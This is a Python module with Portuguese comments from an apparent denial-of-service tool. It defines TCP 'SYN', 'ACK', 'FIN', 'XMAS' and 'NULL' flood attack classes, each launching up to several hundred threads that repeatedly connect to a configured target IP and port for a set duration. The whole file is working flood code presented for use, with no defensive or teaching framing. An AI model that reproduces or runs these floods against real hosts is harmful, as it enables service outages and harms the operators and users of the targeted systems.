"""
Implementação de ataques TCP - ALTA PERFORMANCE
"""
import socket
import time
import random
import struct
import threading
from typing import Optional
from .base import BaseAttack
from ..core.config import AttackConfig

class TCPSynFlood(BaseAttack):
    """TCP SYN Flood Attack - ALTA PERFORMANCE"""
    
    def execute(self):
        self.running = True
        print("🚀 Iniciando TCP SYN Flood (Alta Performance)...")
        
        def attack_thread(thread_id):
            packets_sent = 0
            errors = 0
            start_time = time.time()
            
            while (not self.stop_event.is_set() and 
                   (time.time() - start_time) < self.config.duration):
                try:
                    # Socket com timeout muito curto
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.5)  # Timeout reduzido drasticamente
                    
                    # Tenta conectar (envia SYN)
                    sock.connect((self.config.target_ip, self.config.target_port))
                    packets_sent += 1
                    self._update_stats(60)  # Tamanho aproximado do pacote SYN
                    
                    # Fecha socket imediatamente
                    sock.close()
                    
                except (socket.timeout, ConnectionRefusedError, OSError):
                    # Esses erros são esperados em flood - não contabiliza como erro real
                    pass
                except Exception as e:
                    errors += 1
                    if errors % 100 == 0:  # Log a cada 100 erros
                        self._handle_error()
            
            print(f"🧵 Thread {thread_id}: {packets_sent} SYN, {errors} erros")
        
        # AUMENTA número de threads para TCP
        max_threads = min(self.config.threads, 500)  # Mais threads para TCP
        print(f"🔧 Usando {max_threads} threads para SYN Flood")
        
        threads = []
        for i in range(max_threads):
            if self.stop_event.is_set():
                break
            thread = threading.Thread(target=attack_thread, args=(i,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        # Aguarda threads
        for thread in threads:
            thread.join(timeout=self.config.duration + 2)

class TCPAckFlood(BaseAttack):
    """TCP ACK Flood Attack - Implementação Real"""
    
    def execute(self):
        self.running = True
        print("🚀 Iniciando TCP ACK Flood...")
        
        def attack_thread(thread_id):
            packets_sent = 0
            errors = 0
            start_time = time.time()
            
            while (not self.stop_event.is_set() and 
                   (time.time() - start_time) < self.config.duration):
                try:
                    # Usa conexões TCP normais como fallback
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    
                    # Conecta e envia dados (simula ACK)
                    sock.connect((self.config.target_ip, self.config.target_port))
                    
                    # Envia pequeno payload
                    payload = b'A' * 10
                    sock.send(payload)
                    packets_sent += 1
                    self._update_stats(len(payload) + 40)  # + cabeçalhos
                    
                    sock.close()
                    
                except Exception:
                    errors += 1
                    if errors % 100 == 0:
                        self._handle_error()
            
            print(f"🧵 Thread {thread_id}: {packets_sent} ACK, {errors} erros")
        
        max_threads = min(self.config.threads, 300)
        print(f"🔧 Usando {max_threads} threads para ACK Flood")
        
        threads = []
        for i in range(max_threads):
            if self.stop_event.is_set():
                break
            thread = threading.Thread(target=attack_thread, args=(i,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        for thread in threads:
            thread.join(timeout=self.config.duration + 2)

class TCPFinFlood(BaseAttack):
    """TCP FIN Flood Attack"""
    
    def execute(self):
        self.running = True
        print("🚀 Iniciando TCP FIN Flood...")
        
        def attack_thread(thread_id):
            packets_sent = 0
            errors = 0
            start_time = time.time()
            
            while (not self.stop_event.is_set() and 
                   (time.time() - start_time) < self.config.duration):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    sock.connect((self.config.target_ip, self.config.target_port))
                    # Envia FIN imediatamente após conectar
                    sock.shutdown(socket.SHUT_WR)
                    packets_sent += 1
                    self._update_stats(40)
                    sock.close()
                    
                except Exception:
                    errors += 1
                    if errors % 100 == 0:
                        self._handle_error()
            
            print(f"🧵 Thread {thread_id}: {packets_sent} pacotes FIN, {errors} erros")
        
        max_threads = min(self.config.threads, 300)
        threads = []
        for i in range(max_threads):
            if self.stop_event.is_set():
                break
            thread = threading.Thread(target=attack_thread, args=(i,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        for thread in threads:
            thread.join(timeout=self.config.duration + 5)

class TCPXmasAttack(BaseAttack):
    """TCP XMAS Attack (FIN/URG/PSH)"""
    
    def execute(self):
        self.running = True
        print("🚀 Iniciando TCP XMAS Attack...")
        
        # Fallback para FIN Flood se não tiver privilégios
        print("💡 Executando TCP FIN Flood como alternativa (sem raw sockets)...")
        fin_flood = TCPFinFlood(self.config, self.stats_manager)
        fin_flood.stop_event = self.stop_event
        fin_flood.execute()

class TCPNullAttack(BaseAttack):
    """TCP NULL Attack (sem flags)"""
    
    def execute(self):
        self.running = True
        print("🚀 Iniciando TCP NULL Attack...")
        
        # Fallback para SYN Flood se não tiver privilégios
        print("💡 Executando TCP SYN Flood como alternativa (sem raw sockets)...")
        syn_flood = TCPSynFlood(self.config, self.stats_manager)
        syn_flood.stop_event = self.stop_event
        syn_flood.execute()
